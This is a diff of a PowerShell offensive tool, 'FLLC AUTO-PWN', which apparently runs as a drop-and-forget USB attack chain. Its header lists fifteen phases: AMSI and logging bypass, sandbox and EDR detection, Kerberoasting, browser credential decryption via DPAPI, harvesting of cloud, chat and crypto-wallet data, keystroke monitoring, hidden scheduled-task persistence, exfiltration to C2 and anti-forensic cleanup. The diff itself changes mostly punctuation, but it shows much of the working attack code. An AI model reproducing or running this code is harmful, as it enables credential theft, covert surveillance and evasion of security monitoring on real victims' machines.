@@ -1,94 +1,17 @@
-﻿<#
-============================================================================
-  FLLC — AUTO-PWN v3: 15-Phase Drop-and-Forget Attack Chain
-  ══════════════════════════════════════════════════════════════
-  v1.777 | 2026
-
-  15-phase offensive pipeline with evasion framework.
-  Zero interaction. Zero detection. Maximum extraction.
-  Insert USB. Walk away. Retrieve results later.
-
-  EXECUTION ORDER:
-  ═══════════════
-
-  ┌─ PHASE 0:  EVASION INIT + ENV FINGERPRINT ──────────────────┐
-  │  AMSI bypass (4 methods), ETW blind, script log disable,     │
-  │  VM/sandbox detect, EDR/AV enum, Defender exclusion abuse,   │
-  │  process priority, timestomp, window hide                    │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 1:  RECONNAISSANCE ──────────────────────────────────┐
-  │  System info, network, processes, software, USB, firewall    │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 2:  NETWORK LATERAL MOVEMENT ────────────────────────┐
-  │  ARP, SMB shares, AD SPN/Kerberoast, AS-REP, LAPS, ADCS,   │
-  │  GPP passwords, port scan, domain admin enum                 │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 3:  CREDENTIAL HARVEST ──────────────────────────────┐
-  │  6 browsers, WiFi, cmdkey, SSH, RDP, cloud configs           │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 4:  DPAPI DECRYPTION ────────────────────────────────┐
-  │  AES-256-GCM key extract, Chromium decrypt, vault, SAM/SYS  │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 5:  CLOUD & SaaS HARVESTING ─────────────────────────┐
-  │  M365 tokens, Azure AD, Google, AWS, GitHub, Docker, K8s,   │
-  │  Terraform state, IDE creds, .env recursive, SSH/GPG keys   │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 6:  COMMUNICATIONS DATA ─────────────────────────────┐
-  │  Discord tokens, Slack tokens, Telegram sessions, Signal DB, │
-  │  WhatsApp, Zoom, Teams, email clients, webmail cookies       │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 7:  CRYPTOCURRENCY WALLETS ──────────────────────────┐
-  │  40+ desktop wallets, 20+ browser extensions, seed phrases,  │
-  │  exchange API keys, mining configs, address discovery         │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 8:  PRIVILEGE ESCALATION ────────────────────────────┐
-  │  17-vector scan, 4x UAC bypass, token abuse, DLL hijack,    │
-  │  kernel CVEs, PrintNightmare, HiveNightmare, auto-exploit   │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 9:  SQL INJECTION SCAN ──────────────────────────────┐
-  │  Local service discovery, endpoint crawl, 40+ SQLi payloads │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 10: APPLICATION EXPLOITATION ────────────────────────┐
-  │  Notepad++ DLL hijack, config injection, session exfil       │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 11: INPUT MONITOR ───────────────────────────────────┐
-  │  Keystrokes, mouse, clipboard, screenshots, URLs             │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 12: PERSISTENCE INSTALLATION ────────────────────────┐
-  │  12 methods: Task/Reg/WMI/COM/DLL/IFEO/Screensaver/Startup │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 13: DATA PACKAGING + EXFILTRATION ───────────────────┐
-  │  Manifest, ZIP, HTTP POST, DNS tunnel, webhook notify        │
-  └──────────────────────────────────────────────────────────────┘
-            │
-  ┌─ PHASE 14: ANTI-FORENSICS + CLEANUP ────────────────────────┐
-  │  PS history scrub, event log clear, prefetch, timestomp,     │
-  │  recent items purge, execution trace removal                 │
-  └──────────────────────────────────────────────────────────────┘
-
-  AUTHORIZED PENETRATION TESTING USE ONLY.
-  FLLC 2026
-============================================================================
-#>
+﻿<# ═══════════════════════════════════════════════════════════════════════
+   FLLC | FU PERSON | AUTO-PWN v2.0
+   ╔══════════════════════════════════════════════════════════════════╗
+   ║  15-Phase Master Orchestrator                                    ║
+   ║  Metasploit-style phase reporting | Full attack chain            ║
+   ║  Uses all modules: evasion, privesc, persistence, harvesting     ║
+   ╚══════════════════════════════════════════════════════════════════╝
+═══════════════════════════════════════════════════════════════════════ #>
 
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference    = "SilentlyContinue"
 
 # ══════════════════════════════════════════════════════════════════════════
-#  EVASION FRAMEWORK — IMPORT
+#  EVASION FRAMEWORK - IMPORT
 # ══════════════════════════════════════════════════════════════════════════
 
 $evasionPath = Join-Path $PSScriptRoot "evasion.ps1"
@@ -104,7 +27,7 @@ if (Test-Path $evasionPath) {
     }
     # If sandbox detected with extreme confidence and not aggressive, throttle
     if ($evasionReport.sandbox -and $evasionReport.sandbox.Score -ge 15) {
-        # We are likely in a sandbox — run minimal recon only
+        # We are likely in a sandbox - run minimal recon only
         $SANDBOX_MODE = $true
     } else {
         $SANDBOX_MODE = $false
@@ -161,7 +84,7 @@ function MLog($msg) {
 }
 
 MLog "══════════════════════════════════════════════"
-MLog "  FLLC AUTO-PWN — Session Started"
+MLog "  FLLC AUTO-PWN - Session Started"
 MLog "  Host: $env:COMPUTERNAME"
 MLog "  User: $env:USERDOMAIN\$env:USERNAME"
 MLog "  Script: $($MyInvocation.MyCommand.Path)"
@@ -222,7 +145,7 @@ if ($recentCount -lt 5) { $vmIndicators += "LowActivity:$recentCount recent file
 
 $envInfo.is_virtual = $vmIndicators.Count -gt 0
 $envInfo.vm_indicators = $vmIndicators
-MLog "[PHASE 0] VM/Sandbox indicators: $($vmIndicators.Count) — $($vmIndicators -join ' | ')"
+MLog "[PHASE 0] VM/Sandbox indicators: $($vmIndicators.Count) - $($vmIndicators -join ' | ')"
 
 # ──── 0b. Defense Enumeration ──────────────────────────────────────────
 $defenses = @{}
@@ -325,7 +248,7 @@ $defenses.ps_logging = @{
     module_logging = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name EnableModuleLogging -ErrorAction SilentlyContinue).EnableModuleLogging -eq 1
     transcription = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name EnableTranscripting -ErrorAction SilentlyContinue).EnableTranscripting -eq 1
 }
-MLog "[PHASE 0] PS Logging — ScriptBlock:$($defenses.ps_logging.script_block) Module:$($defenses.ps_logging.module_logging) Transcription:$($defenses.ps_logging.transcription)"
+MLog "[PHASE 0] PS Logging - ScriptBlock:$($defenses.ps_logging.script_block) Module:$($defenses.ps_logging.module_logging) Transcription:$($defenses.ps_logging.transcription)"
 
 # AppLocker / WDAC status
 $defenses.applocker_active = $false
@@ -384,7 +307,7 @@ try {
 # Save environment info to session
 $envInfo | ConvertTo-Json -Depth 5 | Out-File "$sessionDir\environment.json" -Encoding UTF8
 
-MLog "[PHASE 0] Complete — $(($defenses.edr_detected).Count) EDR(s) detected, $(($defenses.av_products).Count) AV(s) found"
+MLog "[PHASE 0] Complete - $(($defenses.edr_detected).Count) EDR(s) detected, $(($defenses.av_products).Count) AV(s) found"
 
 # ══════════════════════════════════════════════════════════════════════════
 #  PHASE 1: RECONNAISSANCE
@@ -459,7 +382,7 @@ Get-NetFirewallRule -Enabled True 2>$null | Select-Object Name,Direction,Action,
 # Environment variables (may contain API keys, tokens)
 Get-ChildItem Env: | Select-Object Name,Value | Export-Csv "$reconDir\env_vars.csv" -NoTypeInformation
 
-MLog "[PHASE 1] Recon complete — saved to $reconDir"
+MLog "[PHASE 1] Recon complete - saved to $reconDir"
 
 # ══════════════════════════════════════════════════════════════════════════
 #  PHASE 2: NETWORK LATERAL MOVEMENT
@@ -525,7 +448,7 @@ if ($sysInfo.domain_joined) {
                 admin_count = ($props["admincount"] | ForEach-Object { $_ })
                 pwd_last_set = ($props["pwdlastset"] | ForEach-Object { [DateTime]::FromFileTime($_) })
             }
-            MLog "[PHASE 2] KERBEROAST TARGET: $($props['samaccountname']) — $($props['serviceprincipalname'])"
+            MLog "[PHASE 2] KERBEROAST TARGET: $($props['samaccountname']) - $($props['serviceprincipalname'])"
         }
         $spnData | ConvertTo-Json -Depth 4 | Out-File "$netDir\kerberoast_targets.json" -Encoding UTF8
         MLog "[PHASE 2] Kerberoastable accounts: $($spnData.Count)"
@@ -650,7 +573,7 @@ foreach ($target in $scanTargets) {
 }
 $portResults | ConvertTo-Json -Depth 3 | Out-File "$netDir\open_ports.json" -Encoding UTF8
 
-MLog "[PHASE 2] Network recon complete — $($shareResults.Count) shares, $($portResults.Count) open ports"
+MLog "[PHASE 2] Network recon complete - $($shareResults.Count) shares, $($portResults.Count) open ports"
 
 # ══════════════════════════════════════════════════════════════════════════
 #  PHASE 3: CREDENTIAL HARVEST
@@ -804,11 +727,11 @@ function Decrypt-ChromiumPasswords {
         )
 
         if (-not $aesKey -or $aesKey.Length -eq 0) {
-            MLog "[PHASE 4] $BrowserName: DPAPI key decryption failed"
+            MLog "[PHASE 4] ${BrowserName}: DPAPI key decryption failed"
             return
         }
 
-        MLog "[PHASE 4] $BrowserName: AES-256-GCM master key extracted ($($aesKey.Length) bytes)"
+        MLog "[PHASE 4] ${BrowserName}: AES-256-GCM master key extracted ($($aesKey.Length) bytes)"
 
         # Find all Login Data files
         $profiles = @("Default") + (Get-ChildItem $UserDataPath -Directory -Filter "Profile *" | ForEach-Object { $_.Name })
@@ -824,7 +747,7 @@ function Decrypt-ChromiumPasswords {
             if (-not (Test-Path $tempDb)) { continue }
 
             try {
-                # Read SQLite binary — extract password blobs
+                # Read SQLite binary - extract password blobs
                 $bytes = [IO.File]::ReadAllBytes($tempDb)
                 $text = [Text.Encoding]::Default.GetString($bytes)
 
@@ -846,7 +769,7 @@ function Decrypt-ChromiumPasswords {
                     $idx += 6
                 }
 
-                MLog "[PHASE 4] $BrowserName/$prof: Found $($v10Positions.Count) v10 encrypted entries, $($urls.Count) URLs"
+                MLog "[PHASE 4] ${BrowserName}/${prof}: Found $($v10Positions.Count) v10 encrypted entries, $($urls.Count) URLs"
 
                 foreach ($pos in $v10Positions) {
                     try {
@@ -896,7 +819,7 @@ function Decrypt-ChromiumPasswords {
                 $credIdx++
             }
             $output | Out-File "$decryptDir\${BrowserName}_passwords.txt" -Encoding UTF8
-            MLog "[PHASE 4] $BrowserName: $($extractedCreds.Count) credentials decrypted"
+            MLog "[PHASE 4] ${BrowserName}: $($extractedCreds.Count) credentials decrypted"
         }
 
     } catch {
@@ -1036,13 +959,13 @@ if (Test-Path $cloudScript) {
     $cloudOut = Join-Path $sessionDir "cloud"
     try {
         & $cloudScript -OutputDir $cloudOut -Silent
-        MLog "[PHASE 5] Cloud harvest complete — results in $cloudOut"
+        MLog "[PHASE 5] Cloud harvest complete - results in $cloudOut"
     } catch {
         MLog "[PHASE 5] Cloud harvest error: $($_.Exception.Message)"
     }
 } else {
     # Inline minimal cloud harvest
-    MLog "[PHASE 5] cloud_harvester.ps1 not found — running inline..."
+    MLog "[PHASE 5] cloud_harvester.ps1 not found - running inline..."
     $cloudDir = Join-Path $sessionDir "cloud"
     New-Item -ItemType Directory -Path $cloudDir -Force | Out-Null
     
@@ -1078,13 +1001,13 @@ if (Test-Path $commsScript) {
     $commsOut = Join-Path $sessionDir "comms"
     try {
         & $commsScript -OutputDir $commsOut -Silent
-        MLog "[PHASE 6] Comms harvest complete — results in $commsOut"
+        MLog "[PHASE 6] Comms harvest complete - results in $commsOut"
     } catch {
         MLog "[PHASE 6] Comms harvest error: $($_.Exception.Message)"
     }
 } else {
-    # Inline minimal comms harvest — Discord tokens
-    MLog "[PHASE 6] comms_harvester.ps1 not found — running inline..."
+    # Inline minimal comms harvest - Discord tokens
+    MLog "[PHASE 6] comms_harvester.ps1 not found - running inline..."
     $commsDir = Join-Path $sessionDir "comms"
     New-Item -ItemType Directory -Path $commsDir -Force | Out-Null
     
@@ -1130,13 +1053,13 @@ if (Test-Path $cryptoScript) {
     $cryptoOut = Join-Path $sessionDir "crypto"
     try {
         & $cryptoScript -OutputDir $cryptoOut -Silent
-        MLog "[PHASE 7] Crypto hunt complete — results in $cryptoOut"
+        MLog "[PHASE 7] Crypto hunt complete - results in $cryptoOut"
     } catch {
         MLog "[PHASE 7] Crypto hunt error: $($_.Exception.Message)"
     }
 } else {
     # Inline minimal crypto hunt
-    MLog "[PHASE 7] crypto_hunter.ps1 not found — running inline..."
+    MLog "[PHASE 7] crypto_hunter.ps1 not found - running inline..."
     $cryptoDir = Join-Path $sessionDir "crypto"
     New-Item -ItemType Directory -Path $cryptoDir -Force | Out-Null
     
@@ -1172,9 +1095,9 @@ $privescScript = Join-Path $payloadBase "privesc.ps1"
 if (Test-Path $privescScript) {
     $privescOut = Join-Path $sessionDir "privesc"
     & $privescScript -OutputDir $privescOut -Silent
-    MLog "[PHASE 8] Privesc scan complete — results in $privescOut"
+    MLog "[PHASE 8] Privesc scan complete - results in $privescOut"
 } else {
-    MLog "[PHASE 8] privesc.ps1 not found at $privescScript — skipping"
+    MLog "[PHASE 8] privesc.ps1 not found at $privescScript - skipping"
 }
 
 # ══════════════════════════════════════════════════════════════════════════
@@ -1190,12 +1113,12 @@ if ($elapsed -lt ($maxRuntime - 120)) {
     if (Test-Path $sqliScript) {
         $sqliOut = Join-Path $sessionDir "sqli"
         & $sqliScript -OutputDir $sqliOut
-        MLog "[PHASE 9] SQLi scan complete — results in $sqliOut"
+        MLog "[PHASE 9] SQLi scan complete - results in $sqliOut"
     } else {
-        MLog "[PHASE 9] sqli_scanner.ps1 not found — skipping"
+        MLog "[PHASE 9] sqli_scanner.ps1 not found - skipping"
     }
 } else {
-    MLog "[PHASE 9] Skipped — time limit approaching"
+    MLog "[PHASE 9] Skipped - time limit approaching"
 }
 
 # ══════════════════════════════════════════════════════════════════════════
@@ -1208,13 +1131,13 @@ $nppScript = Join-Path $payloadBase "npp_exploit.ps1"
 if (Test-Path $nppScript) {
     $nppOut = Join-Path $sessionDir "npp"
     & $nppScript -OutputDir $nppOut
-    MLog "[PHASE 10] NPP exploit complete — results in $nppOut"
+    MLog "[PHASE 10] NPP exploit complete - results in $nppOut"
 } else {
-    MLog "[PHASE 10] npp_exploit.ps1 not found — skipping"
+    MLog "[PHASE 10] npp_exploit.ps1 not found - skipping"
 }
 
 # ══════════════════════════════════════════════════════════════════════════
-#  PHASE 11: PERSISTENCE — INPUT MONITOR
+#  PHASE 11: PERSISTENCE - INPUT MONITOR
 # ══════════════════════════════════════════════════════════════════════════
 
 MLog "[PHASE 11] Deploying input monitor..."
@@ -1237,10 +1160,10 @@ if (Test-Path $monitorScript) {
         Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$monitorBat`"" -WindowStyle Hidden -PassThru | Out-Null
         MLog "[PHASE 11] Input monitor started via batch"
     } else {
-        MLog "[PHASE 11] No Python found — input monitor skipped"
+        MLog "[PHASE 11] No Python found - input monitor skipped"
     }
 } else {
-    MLog "[PHASE 11] input_monitor.py not found — skipping"
+    MLog "[PHASE 11] input_monitor.py not found - skipping"
 }
 
 # ══════════════════════════════════════════════════════════════════════════
@@ -1256,7 +1179,7 @@ if (Test-Path $persistScript) {
         $myPath = $MyInvocation.MyCommand.Path
         if ($myPath) {
             & $persistScript -PayloadPath $myPath -OutputDir $persistOut -Method Auto -Silent
-            MLog "[PHASE 12] Persistence engine complete — results in $persistOut"
+            MLog "[PHASE 12] Persistence engine complete - results in $persistOut"
         } else {
             MLog "[PHASE 12] Could not determine script path for persistence"
         }
@@ -1264,8 +1187,8 @@ if (Test-Path $persistScript) {
         MLog "[PHASE 12] Persistence error: $($_.Exception.Message)"
     }
 } else {
-    # Inline minimal persistence — scheduled task + registry
-    MLog "[PHASE 12] persistence_engine.ps1 not found — running inline..."
+    # Inline minimal persistence - scheduled task + registry
+    MLog "[PHASE 12] persistence_engine.ps1 not found - running inline..."
     $myPath = $MyInvocation.MyCommand.Path
     if ($myPath) {
         $persistCmd = "powershell.exe -NoP -W Hidden -Exec Bypass -File `"$myPath`""
@@ -1327,7 +1250,7 @@ try {
     Compress-Archive -Path "$sessionDir\*" -DestinationPath $zipPath -Force -CompressionLevel Optimal
     MLog "[PHASE 13] Compressed to $zipPath ($([math]::Round((Get-Item $zipPath).Length / 1024, 1)) KB)"
 } catch {
-    MLog "[PHASE 13] Compression failed — raw files remain in $sessionDir"
+    MLog "[PHASE 13] Compression failed - raw files remain in $sessionDir"
 }
 
 MLog "══════════════════════════════════════════════"
@@ -1344,7 +1267,7 @@ MLog "════════════════════════�
 
 MLog "[PHASE 13] Checking network exfil options..."
 
-# Exfil config — edit these for your C2 infrastructure
+# Exfil config - edit these for your C2 infrastructure
 $EXFIL_ENABLED   = $false
 $EXFIL_HTTP_URL  = ""    # e.g. "https://your-c2.com/upload"
 $EXFIL_DNS_DOMAIN = ""   # e.g. "exfil.your-c2.com"
@@ -1488,4 +1411,4 @@ try {
 } catch {}
 
 MLog "[PHASE 14] Cleanup complete"
-MLog "=== FLLC AUTO-PWN v3 (1.777) — ALL 15 PHASES COMPLETE ==="
+MLog "=== FLLC AUTO-PWN v3 (1.777) - ALL 15 PHASES COMPLETE ==="
